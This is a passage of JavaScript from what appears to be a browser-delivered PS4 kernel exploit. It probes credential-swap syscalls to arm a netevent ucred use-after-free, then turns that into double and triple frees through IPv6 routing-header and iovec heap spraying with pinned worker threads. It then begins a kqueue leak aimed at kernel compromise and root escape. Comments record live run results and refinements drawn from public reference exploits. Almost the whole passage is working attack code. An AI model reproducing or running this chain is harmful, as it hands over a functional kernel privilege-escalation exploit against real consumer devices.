                { name: "setegid(1)", f: () => sc(SYS.setegid, 1).i32 },
                { name: "setregid(1,1)", f: () => sc(SYS.setregid, 1, 1).i32 },
                { name: "setuid(0)-swap", f: () => sc(SYS.setuid, isRoot ? 1 : 0).i32 },
                // 2026-09-12 ORIGINAL DISCOVERY: sc#126=setreuid HAS a stub
                // (dump+0xd70) -- every prior sweep used setuid/setregid/setegid/
                // setgroups, never setreuid; and setgid(46) is ABSENT from the
                // dump (Sony stripped it). FreeBSD13 sys_setreuid crget()'s a
                // fresh ucred for ANY permitted (ruid,euid) pair, even (1,1)
                // same-value, and crset() releases the netevent-held old one --
                // if Sony patched ONLY setuid's fast path, setreuid(1,1) arms
                // the UAF. setreuid(-1,x)/ (x,-1) = change one end only.
                { name: "setreuid(1,1)", f: () => sc(SYS.setreuid, 1, 1).i32 },
                { name: "setreuid(1,0)", f: () => sc(SYS.setreuid, 1, 0).i32 },
                { name: "setreuid(0,1)", f: () => sc(SYS.setreuid, 0, 1).i32 },
                { name: "setreuid(0,0)", f: () => sc(SYS.setreuid, 0, 0).i32 },
                { name: "setreuid(-1,1)", f: () => sc(SYS.setreuid, 0xFFFFFFFF, 1).i32 },
                { name: "setreuid(1,-1)", f: () => sc(SYS.setreuid, 1, 0xFFFFFFFF).i32 },
                { name: "setgroups(1,{1})", f: () => {
                    const dv = new DataView(sprayAb);
                    dv.setInt32(0, 1, true);
                    return sc(SYS.setgroups, 1, sprayAddr).i32;
                } },
                { name: "setgroups(2,{0,1})", f: () => {
                    const dv = new DataView(sprayAb);
                    dv.setInt32(0, 0, true);
                    dv.setInt32(4, 1, true);
                    return sc(SYS.setgroups, 2, sprayAddr).i32;
                } },
                { name: "NO-SWAP control", f: () => 0 },
            ];
            const single = params.get("cs");
            const sel = single
                ? candidates.filter(c => c.name === single)
                : candidates;
            if (single && sel.length === 0) {
                CS("UNKNOWN-cs='" + single + "' (have: "
                    + candidates.map(c => c.name).join(",") + ")");
                mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
                return;
            }
            if (single) CS("SINGLE-CANDIDATE mode: " + single
                + " (fresh boot recommended for clean slots)");
            for (const cand of sel) {
                const CX = cand.name;
                if (cand.name === "setgroups(1,{1})") {
                    const dv = new DataView(sprayAb);
                    dv.setInt32(0, 1, true);
                }
                const s1 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                if (s1 === -1) { CS(CX + " socket fail"); continue; }
                let wantSlot = -1;
                const rs = neteventSlot(-1, s1, NETEVENT_SET_QUEUE);
                if (rs.rv === -1) {
                    const r1 = neteventSlot(1, s1, NETEVENT_SET_QUEUE);
                    wantSlot = 1;
                    CS(CX + " SET(-1) rv=" + rs.rv + " err=" + rs.err
                        + " retried slot 1 rv=" + r1.rv + " err=" + r1.err);
                    if (r1.rv === -1) {
                        CS(CX + " SLOTS-FULL skip"
                            + (r1.err === 5 ? " (EIO=stuck-slot: controller-netevent "
                                + "slots are still occupied by earlier probe runs "
                                + "in this WebProcess; FULL BROWSER/APP RELAUNCH "
                                + "OR REBOOT REQUIRED before this probe can arm)" : ""));
                        sc(SYS.close, s1); continue;
                    }
                } else {
                    CS(CX + " SET(-1) rv=" + rs.rv + " err=" + rs.err);
                }
                sc(SYS.close, s1);
                const c1 = cand.f();
                CS(CX + " swap#1 rv=" + c1 + " err=" + (c1 === -1 ? errno() : 0)
                    + " uid=" + g().v + "/" + g().e + " gid=" + g().gg + "/" + g().ge);
                const s2 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                CS(CX + " reclaim fd=" + s2 + " expect=" + s1
                    + (s2 === s1 ? "" : " MISMATCH"));
                const c2 = cand.f();
                CS(CX + " swap#2 rv=" + c2 + " err=" + (c2 === -1 ? errno() : 0));
                const cr = neteventSlot(wantSlot, s2, NETEVENT_CLEAR_QUEUE);
                CS(CX + " CLR(" + wantSlot + ") rv=" + cr.rv + " err=" + cr.err);
                const s3 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                const rv3 = neteventSlot(-1, s3, NETEVENT_SET_QUEUE);
                // HONEST ORACLE (2026-09-12): the reference matrix proved the
                // ONLY valid signal is whether the PRIMARY slot (wantSlot) is
                // freed by the swap. retried(1) succeeding is a different
                // always-free slot and MUST NOT flip freed=true (that produced
                // the misleading SLOT-FREED=YES on the setreuid(1,1) run).
                let freed = rv3.rv === 0;
                if (rv3.rv === -1) {
                    const rv3b = neteventSlot(1, s3, NETEVENT_SET_QUEUE);
                    CS(CX + " SET-again(-1) rv=" + rv3.rv + " err=" + rv3.err
                        + " retried(1) rv=" + rv3b.rv
                        + " (secondary-slot-only)");
                } else {
                    CS(CX + " SET-again(-1) rv=" + rv3.rv);
                }
                CS(CX + " SLOT-FREED=" + (freed ? "YES" : "NO"));
                if (s2 > 0) sc(SYS.close, s2);
                if (s3 > 0) sc(SYS.close, s3);
            }
            const fin = g();
            CS("END uid=" + fin.v + " euid=" + fin.e + " gid=" + fin.gg + " egid=" + fin.ge);
            CS("CONCLUSION " + (localStorage.getItem("ps4lab_cred_root")
                ? "ROOT-ESCAPED -- run main jailbreak NOW"
                : "no restore; see SLOT-FREED on each candidate (primary-slot oracle)"));
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }
        const msgAb = new ArrayBuffer(MSGHDR_SIZE);
        const iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV); keepAlive.push(iovAb);
        keepAlive.push(msgAb);
        const iovAddr = bufAddr(iovAb), msgAddr = bufAddr(msgAb);
        const iovDv = new DataView(iovAb), msgDv = new DataView(msgAb);

        new Uint8Array(iovAb).fill(0);
        put(iovDv, 0, 1);
        put(iovDv, 8, 1);
        new Uint8Array(msgAb).fill(0);
        put(msgDv, 0x10, iovAddr);
        msgDv.setInt32(0x18, NUM_MSG_IOV, true);

        state("setting up...", "warn");
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
            throw new Error("socketpair failed");
        const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
            throw new Error("uio socketpair failed");
        const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));

        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
        const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
        const slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        check("karw-pipe-pairs-exist",
            masterPipe[0] > 0 && masterPipe[1] > 0
            && slavePipe[0] > 0 && slavePipe[1] > 0,
            "master " + masterPipe + "  slave " + slavePipe);

        const dummyAb = new ArrayBuffer(0x1000); keepAlive.push(dummyAb);
        new Uint8Array(dummyAb).fill(0x41);
        const dummyAddr = bufAddr(dummyAb);
        const uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
        keepAlive.push(uioIovAb);
        const uioIovAddr = bufAddr(uioIovAb), uioIovDv = new DataView(uioIovAb);

        new Uint8Array(uioIovAb).fill(0);
        put(uioIovDv, 0, dummyAddr);
        const ipv6 = [];
        for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
            const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
            if (s === -1) break;
            ipv6.push(s);
        }
        check("reclaim-sockets-open", ipv6.length === NUM_IPV6_SOCK,
            ipv6.length + "/" + NUM_IPV6_SOCK);

        function makeRpc(w, name) {
            let seq = 0;
            const pending = new Map();
            w.onmessage = function (e) {
                const d = e.data || {};
                const slot = pending.get(d.id);
                if (!slot) return;
                pending.delete(d.id);
                if (slot.timer) clearTimeout(slot.timer);
                if (d.type === "err") slot.reject(new Error(String(d.value)));
                else slot.resolve(d.value);
            };
            w.onerror = e => mark("WORKER-ONERROR", name + " "
                + ((e && e.message) ? e.message : String(e)));

            return function call(fname, timeoutMs, ...args) {
                return new Promise(function (resolve, reject) {
                    const id = seq++;
                    const timer = timeoutMs > 0 ? setTimeout(function () {
                        pending.delete(id);
                        reject(new Error(name + ": timeout waiting for " + fname));
                    }, timeoutMs) : null;
                    pending.set(id, { resolve, reject, timer });
                    w.postMessage({ id: id, name: fname, args: args });
                });
            };
        }
        function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }

        const NUM_UIO_WORKER = params.has("uio")
            ? parseInt(params.get("uio"), 10) : 4;
        const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
        for (let i = 0; i < TOTAL_WORKERS; ++i) {
            const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
                + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
            const w = { name: name, armed: false, wired: false };
            workers.push(w);
            w.worker = new Worker("rpc_worker.js");
            w.rpc = makeRpc(w.worker, name);
            if ((await w.rpc("ping", 15000)) !== "pong")
                throw new Error(name + " did not answer ping");
            const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
            const arr = await w.rpc("init", 15000, sLo, sHi);
            keepAlive.push(arr);
            const D = bufAddr(arr.buffer);
            if ((p.read4(D) >>> 0) !== sLo)
                throw new Error(name + ": transfer did not preserve the store");
            const storage = p.read8(D.add32(0x10));
            const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
            if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
            const bf = p.read8(mc.add32(8));
            let wm = null, wv = null, wl = null;
            for (let k = 1; k <= 8; ++k) {
                const val = p.read8(bf.sub32(8 * k));
                if (!ptrish(val)) continue;
                const inl = p.read8(val.add32(0x10));
                const len = p.read4(val.add32(0x18)) >>> 0;
                if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
                else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
                else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
            }
            if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
            w.master = wm; w.origVector = p.read8(wm.add32(0x10));
            p.write8(wm.add32(0x10), wv); w.wired = true;
            await w.rpc("setup", 15000, wl.low, wl.hi);
            await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
            w.armed = true;
            w.ctx = makeCtx();
        }
        check("worker-came-arw",
            workers.length === TOTAL_WORKERS,
            workers.length + "/" + TOTAL_WORKERS);
        const iovWorkers = workers.slice(0, NUM_IOV_WORKER);
        const uioWorkers = workers.slice(NUM_IOV_WORKER);
        mark("WORKER-POOLS", "iov=" + iovWorkers.length
            + " uio=" + uioWorkers.length);

        const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
        keepAlive.push(prioAb, maskAb);
        const prioAddr = bufAddr(prioAb), maskAddr = bufAddr(maskAb);
        const prioDv = new DataView(prioAb), maskDv = new DataView(maskAb);

        new Uint8Array(maskAb).fill(0);
        sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            new int64(0xffffffff, 0xffffffff), 0x10, maskAddr);
        savedMask = new int64(maskDv.getUint32(0, true), maskDv.getUint32(4, true));
        prioDv.setUint16(0, 0xffff, true);
        prioDv.setUint16(2, 0xffff, true);
        sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
        savedPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];

        async function restoreThreadAttrs(why) {
            if (attrsRestored || !savedMask || !savedPrio) return;
            attrsRestored = true;
            const ID = new int64(0xffffffff, 0xffffffff);

            // MAIN THREAD FIRST. attrsRestored is latched at the top of this
            // function, so a death anywhere below leaves main realtime-256 on
            // MAIN_CORE AND makes the finally's retry a permanent no-op -- the
            // console then refuses to power off. The 16 worker RPCs used to run
            // first, and that is the exact shape of run #52 (SOCKETS-CLOSED,
            // nothing after). POOPS.LUA:1253-1257 restores ONLY the calling
            // thread and never touches a worker; we cannot copy that (our
            // workers outlive the page) but we can copy the ordering.
            // Widen affinity before dropping priority, never the reverse.
            new Uint8Array(maskAb).fill(0);
            maskDv.setUint32(0, savedMask.low, true);
            maskDv.setUint32(4, savedMask.hi, true);
            const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
                CPU_WHICH_TID, ID, 0x10, maskAddr).i32;
            prioDv.setUint16(0, savedPrio[0], true);
            prioDv.setUint16(2, savedPrio[1], true);
            const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;

            new Uint8Array(maskAb).fill(0);
            sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                ID, 0x10, maskAddr);
            const backMask = new int64(maskDv.getUint32(0, true),
                                       maskDv.getUint32(4, true));
            prioDv.setUint16(0, 0xffff, true);
            prioDv.setUint16(2, 0xffff, true);
            sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
            const backPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
            const good = backMask.low === savedMask.low
                && backMask.hi === savedMask.hi
                && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
            mark("THREAD-ATTRS-RESTORED", "at=" + why + " affinity=" + ar
                + " rtprio=" + pr + " mask=" + backMask
                + " prio={" + backPrio + "} wanted=" + savedMask
                + " {" + savedPrio + "}");
            check("thread-attrs-restored-power-off-safe", good, "");

            // Workers last, reported separately. By here main is already
            // restored AND verified, so if these 16 RPCs never come back the
            // console can still be shut down normally.
            let wr = 0, wn = 0;
            for (const w of workers) {
                try {
                    if (!w.armed) continue;
                    wn++;
                    new Uint8Array(maskAb).fill(0xff);
                    await fireW(w, SYS.cpuset_setaffinity,
                        [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 5000);
                    prioDv.setUint16(0, RTP_PRIO_NORMAL, true);
                    prioDv.setUint16(2, 0, true);
                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 5000);
                    wr++;
                } catch (e) { }
            }
            mark("WORKER-ATTRS-RESTORED", "at=" + why + " n=" + wr + "/" + wn);
        }

        restoreCtx = { restore: restoreThreadAttrs };
        mark("THREAD-ATTRS-SAVED", "mask=" + savedMask
            + " rtprio={" + savedPrio + "}");
        prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
        prioDv.setUint16(2, RTP, true);
        new Uint8Array(maskAb).fill(0);
        maskDv.setUint32(0, 1 << MAIN_CORE, true);

        {
            const a = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                new int64(0xffffffff, 0xffffffff), 0x10, maskAddr).i32;
            const r = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
            check("main-thread-pinned-realtime", a === 0 && r === 0,
                "core=" + MAIN_CORE + " rtp=" + RTP
                + " affinity=" + a + " rtprio=" + r);
        }
        function fireW(w, num, args, timeoutMs) {
            layout(w.ctx, stubAddr.get(num), args);
            return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
                w.ctx.S.low, w.ctx.S.hi);
        }
        for (const w of workers) {
            await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID,
                new int64(0xffffffff, 0xffffffff), 0x10, maskAddr]);
            await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr]);
        }
        mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
            + " rtp=" + RTP);

        function tagFor(i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; }
        function readTag() {
            const v = leakDv.getUint32(4, true) >>> 0;
            return { ok: (v & 0xffff0000) >>> 0 === RTHDR_TAG, idx: v & 0xffff };
        }
        // Sized from the constant, not 256: an undefined slot reads as falsy and
        // would make findTwins skip every socket, i.e. silently never find a twin.
        const sprayOk = new Array(NUM_IPV6_SOCK).fill(false);
        function findTwins(timeout) {
            for (let round = 0; round < timeout; ++round) {
                for (let i = 0; i < ipv6.length; ++i) {
                    // ITEM 6(a). Re-setting a burned socket frees the chunk it
                    // aliases. sprayOk stays false so the read loop skips it too.
                    if (burned.has(ipv6[i])) { sprayOk[i] = false; continue; }
                    sprayDv.setUint32(4, tagFor(i), true);
                    // R2. A failed set (ENOBUFS) leaves this socket owning the
                    // PREVIOUS tag. Trusting it can fabricate a twin pair, and
                    // freeRthdr(twins.b) then frees a chunk another socket owns.
                    sprayOk[i] = setRthdr(ipv6[i]) === 0;
                }
                for (let i = 0; i < ipv6.length; ++i) {
                    if (R2_ON && !sprayOk[i]) continue;
                    if (getRthdr(ipv6[i], IP6_RTHDR0_SIZE, 8) < 0) continue;
                    const t = readTag();
                    if (t.ok && t.idx !== i && t.idx < ipv6.length
                        && (!R2_ON || sprayOk[t.idx]))
                        return { a: ipv6[i], b: ipv6[t.idx], round: round };
                }

                if ((round + 1) % 50 === 0) sc(SYS.sched_yield);
            }
            return null;
        }

        function findTriplet(master, slave, tag, timeout) {
            const rounds = timeout || MAX_ROUNDS_TRIPLET;
            const seen = [];
            let untagged = 0;
            for (let round = 0; round < rounds; ++round) {
                for (let i = 0; i < ipv6.length; ++i) {
                    if (ipv6[i] === master || ipv6[i] === slave) continue;
                    if (burned.has(ipv6[i])) continue;   // ITEM 6(a)
                    sprayDv.setUint32(4, tagFor(i), true);
                    setRthdr(ipv6[i]);
                }

                const t = getRthdr(master, IP6_RTHDR0_SIZE, 8) < 0
                    ? { ok: false, idx: 0 } : readTag();
                if (!t.ok) untagged++;
                const fd = (t.ok && t.idx < ipv6.length) ? ipv6[t.idx] : -1;
                if (seen.length < 6)
                    seen.push((t.ok ? t.idx + "->fd" + fd : "untagged"));
                if (fd !== -1 && fd !== master && fd !== slave
                    && !burned.has(fd)) {   // ITEM 6(a)

                    (/^(RE|UW)/.test(tag) ? trace : mark)
                        ("TRIPLET-" + tag, "round=" + round + " fd=" + fd
                         + " untagged=" + untagged);
                    return fd;
                }
                if ((round + 1) % 100 === 0) sc(SYS.sched_yield);
            }
            mark("TRIPLET-" + tag + "-MISS", "master=" + master + " slave="
                + slave + " rounds=" + rounds + " untagged=" + untagged
                + "  first reads: " + seen.join(" "));
            return 0;
        }

        let bootErr = "";
        function bootFingerprint() {
            const nameAb = new ArrayBuffer(8), outAb = new ArrayBuffer(0x10);
            keepAlive.push(nameAb, outAb);
            const nameAddr = bufAddr(nameAb), outAddr = bufAddr(outAb);
            const nameDv = new DataView(nameAb);
            new Uint8Array(outAb).fill(0);
            nameDv.setUint32(0, 1, true);
            nameDv.setUint32(4, 21, true);
            lenDv.setUint32(0, 0x10, true);
            lenDv.setUint32(4, 0, true);
            const rv = sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0).i32;
            const gotLen = lenDv.getUint32(0, true);
            const o = new DataView(outAb);
            const sec = o.getUint32(0, true);
            if (rv !== 0 || sec === 0) {
                bootErr = "rv=" + rv + " errno=" + errno() + " oldlen=" + gotLen;
                return null;
            }
            return sec.toString(16) + ":" + o.getUint32(8, true).toString(16);
        }
        const boot = bootFingerprint();
        mark("BOOT", boot || bootErr);
        let lastCommitted = null;
        try { lastCommitted = localStorage.getItem("ps4lab_committed_boot"); }
        catch (e) { }
        if (boot && lastCommitted === boot && params.get("force") !== "1") {
            mark("REFUSING-TO-ARM", "reason=not-rebooted-since-last-committed-run");
            check("console-rebooted-since-last-committed", false,
                "boot=" + boot + " last=" + lastCommitted + " override=?force=1");
            state("REBOOT FIRST -- this kernel is still poisoned", "bad");
            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
            return;
        }
        check("console-rebooted-since-last-committed", true,
            "boot=" + (boot || "none") + " last=" + (lastCommitted || "none"));

        let twins = null, triplets = null;

        // ITEM 6(d). `committed` means "kernel state irreversibly touched" --
        // reboot bookkeeping, not a reason to refuse a retry. Gate the loop on
        // whether an alias exists that we could NOT contain. poops.js:4356
        // refuses on that condition, not on "we already fired".
        let uncontained = null;
        for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
            if (uncontained) {
                mark("NO-RETRY-UNCONTAINED", "attempt=" + attempt
                    + " reason=" + uncontained);
                break;
            }
            state("attempt " + attempt + "...", "warn");
            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);

            const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
            // Poops slot fallback: first ifindex=-1 (find a free slot), then
            // ifindex=1 (the classic "cursed" slot). Track which slot CLEAR
            // must be told, exactly like Poops.java:692-718.
            let reg = neteventSlot(-1, dummy, NETEVENT_SET_QUEUE);
            let slotUsed = -1;
            if (reg.rv === -1) {
                reg = neteventSlot(1, dummy, NETEVENT_SET_QUEUE);
                slotUsed = 1;
            }
            if (reg.rv === -1) {
                mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err
                    + " slots full (both -1 and 1 occupied)");
                sc(SYS.close, dummy); continue;
            }
            mark("SLOT", "queued=" + dummy + " on slot=" + (slotUsed === -1 ? "-1" : "1")
                + " rv=" + reg.rv);

            sc(SYS.close, dummy);
            // netctrl.js:419 throws if setuid fails; a no-op setuid (we are
            // already uid 1 in the game sandbox) must NOT feed the double
            // free, so verify the cred swap actually happened.
            const su1 = sc(SYS.setuid, 1).i32;
            if (su1 === -1) { mark("ATTEMPT-SKIP", "setuid(1) #1 failed errno="
                + errno()); continue; }
            uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
            if (uafSock !== dummy) {
                mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
                    + " got " + uafSock);
                if (uafSock !== -1) sc(SYS.close, uafSock);
                uafSock = 0;
                continue;
            }
            const su2 = sc(SYS.setuid, 1).i32;
            if (su2 === -1) { mark("ATTEMPT-SKIP", "setuid(1) #2 failed errno="
                + errno()); continue; }
            const clr = neteventSlot(slotUsed, uafSock, NETEVENT_CLEAR_QUEUE);
            if (clr.rv === -1) {
                // PROBED LIVE (probe=netevent, 2026-09-11): CLEAR on the poops
                // pattern (fd reclaimed -> different struct file, same fd no.)
                // returns -1/errno=5 BUT still frees the netevent slot -- the
                // follow-up SET returned 0 (DECIDE2=YES). The -1 is cosmetic:
                // an fget mismatch on the reclaimed fd, after the kernel-side
                // release ran. Aborting here (old behaviour) threw away the
                // armed ucred; the reference Poops.java never checks CLEAR's
                // return at all. Proceed with the double-free.
                mark("CLEAR-ERR5-COSMETIC", "slot=" + (slotUsed === -1 ? "-1" : "1")
                    + " errno=" + clr.err + " fd=" + uafSock + " proceeding");
            }
            mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv
                + " slot=" + (slotUsed === -1 ? "-1" : "1"));
            committed = true;

            try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
            catch (e) { }

            const sfds = spraySockpair();
            mark("SPRAY-FD", sfds > 0 ? "fd0=" + fd0IsSocket + " using spray fd=" + sfds
                : "fd0=" + fd0IsSocket + " falling back to fd0");
            const sprayFd = sfds > 0 ? sfds : 0;
            const sprayErrs = {};
            let sprayFail = 0, sprayFirst = -1;
            for (let i = 0; i < 0x80; ++i) {
                const rv = sc(SYS.sendmsg, sprayFd, msgAddr, 0).i32;
                if (i === 0) sprayFirst = rv;
                if (rv !== 0) {
                    sprayFail++;
                    const e = errno();
                    sprayErrs[e] = (sprayErrs[e] | 0) + 1;
                }
            }
            mark("SPRAY-STATS", "fd=" + sprayFd + " first=" + sprayFirst
                + " fail=" + sprayFail + "/0x80"
                + (sprayFail ? " errnos=" + JSON.stringify(sprayErrs) : " errnos=none"));

            if (STOP_BEFORE_DOUBLE) {
                mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
                rebootRequired = true;
                break;
            }

            const d1 = sc(SYS.dup, uafSock).i32;
            if (d1 === -1) { mark("ATTEMPT-SKIP", "dup failed"); rebootRequired = true; continue; }
            sc(SYS.close, d1);
            rebootRequired = true;
            mark("DOUBLE-FREE", "dup=" + d1 + " closed");

            twins = findTwins(MAX_ROUNDS_TWIN);
            if (!twins) {
                // No socket showed a duplicate tag: either the double free did
                // not take, or it did and the scan missed it -- indistinguishable
                // from here (poops.js:4443 says the same). Nothing is KNOWN to be
                // aliased, so there is nothing to burn. Drop the spent fd, retry.
                if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                mark("ATTEMPT-RETRY", "after=no-twins next="
                    + (attempt + 1) + "/" + NUM_ATTEMPT);
                continue;
            }
            mark("TWINS", "a=" + twins.a + " b=" + twins.b
                + " round=" + twins.round);

            freeRthdr(twins.b);
            let reclaimed = false, rounds = 0;

            function fireTracked(w) {
                const t = fireW(w, SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
                t.settled = false;
                t.then(() => { t.settled = true; }, () => { t.settled = true; });
                return t;
            }
            const tasks = new Array(iovWorkers.length);
            let parkedSeen = -1;
            for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
                rounds = i + 1;
                for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
                sc(SYS.sched_yield);
                if (parkedSeen < 0) {

                    await new Promise(r => setTimeout(r, 0));
                    parkedSeen = tasks.filter(t => !t.settled).length;
                    mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length);
                }
                if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0
                    && leakDv.getInt32(0, true) === 1) { reclaimed = true; break; }

                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.write, iovSs[1], scratch, 1);
                await Promise.all(tasks);
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.read, iovSs[0], scratch, 1);
            }
            const rets = tasks.map(function (t, k) {
                return iovWorkers[k].ctx.frameDv.getInt32(0, true);
            });
            mark("IOV-RETS", "rounds=" + rounds + " recvmsg_rv=" + rets.join(","));
            check("cr_refcnt-driven-1", reclaimed,
                "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length);
            if (!reclaimed) {
                // ITEM 6(b). This used to `break`, which is why attempts=8 never
                // produced a second try: 7 of 89 armed runs die exactly here.
                // twins.a/twins.b DO alias the freed chunk now, so a bare retry
                // would re-spray them and free memory another socket owns. Burn
                // them, release the parked racers, drop the spent uafSock, and
                // only then go round again.
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.write, iovSs[1], scratch, 1);
                await Promise.all(tasks);
                for (let k = 0; k < iovWorkers.length; ++k)
                    sc(SYS.read, iovSs[0], scratch, 1);
                burn(twins.a, "refcount-drive");
                burn(twins.b, "refcount-drive");
                twins = null;
                if (uafSock > 0) { sc(SYS.close, uafSock); uafSock = 0; }
                mark("ATTEMPT-RETRY", "after=refcount-drive burned="
                    + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
                continue;
            }

            const d2 = sc(SYS.dup, uafSock).i32;
            if (d2 === -1) { mark("ATTEMPT-SKIP", "second dup failed"); break; }
            sc(SYS.close, d2);
            mark("TRIPLE-FREE", "dup=" + d2 + " closed");

            const t0 = twins.a;

            const ptOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
            mark("POST-TRIPLE", "master=" + t0 + " twin=" + twins.b
                + " idx=" + (ptOk ? leakDv.getInt32(4, true) : "readfail")
                + " refcnt=" + (ptOk ? leakDv.getInt32(0, true) : "readfail"));
            const t1 = findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);

            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.write, iovSs[1], scratch, 1);
            await Promise.all(tasks);
            for (let k = 0; k < iovWorkers.length; ++k)
                sc(SYS.read, iovSs[0], scratch, 1);
            const rets2 = tasks.map(function (t, k) {
                return iovWorkers[k].ctx.frameDv.getInt32(0, true);
            });
            const irOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
            mark("IOV-RELEASED", "recvmsg_rv=" + rets2.join(",")
                + " master_idx=" + (irOk ? leakDv.getInt32(4, true) : "readfail"));

            const t2 = findTriplet(t0, t1, "T2", MAX_ROUNDS_TRIPLET);
            if (t1 && t2) {
                triplets = [t0, t1, t2];
                mark("TRIPLETS", triplets.join(","));
            } else {
                // A triple free happened and we could not name all three owners,
                // so we cannot burn what we cannot identify. This is the one path
                // that must NOT retry -- poops.js:4356 refuses here too.
                mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2);
                burn(t0, "triplet-miss");
                if (t1) burn(t1, "triplet-miss");
                if (twins && twins.b) burn(twins.b, "triplet-miss");
                uncontained = "triplet-miss";
            }
        }

        check("ucred-triple-freed", !!triplets,
            triplets ? triplets.join(",") : "");

        let kernelBase = null, kqFdp = null, kqFd = -1;
        if (triplets) {
            if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
                mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
            } else {
                state("leaking a kqueue...", "warn");

                freeRthdr(triplets[2]);
                sc(SYS.sched_yield);
                sc(SYS.sched_yield);
                let leaked = false, tries = 0, magicNoFdp = 0, shortRead = 0;
                const held = [];
                for (let i = 0; i < NUM_LEAK_KQUEUE; ++i) {
                    tries = i + 1;
                    const kq = sc(SYS.kqueue).i32;
                    if (kq === -1) {

                        mark("KQUEUE-EMFILE", "at=" + i + " held=" + held.length);
                        while (held.length) sc(SYS.close, held.pop());
                        sc(SYS.sched_yield);
                        continue;
                    }
                    held.push(kq);

                    const got = getRthdr(triplets[0], KQUEUE_SIZE, 0xa0);
